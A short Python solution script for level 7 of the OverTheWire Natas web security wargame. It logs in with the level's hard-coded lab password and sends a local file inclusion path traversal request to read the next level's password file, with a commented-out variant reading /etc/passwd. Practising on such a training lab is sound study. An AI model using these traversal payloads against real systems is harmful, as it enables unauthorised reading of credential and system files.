import requests
import re #regular expressions

username = "natas7"
password = "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0"

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session() #Maintains a session
#response = session.get(url +"/index.php?page=../../../../etc/passwd", auth=(username, password)) #Local File Inclusion Attack
response = session.get(url +"/index.php?page=../../../../etc/natas_webpass/natas8", auth=(username, password))
content = response.text

#print (content)
print (re.findall("<br>\n(.*)\n\n",content)[0])
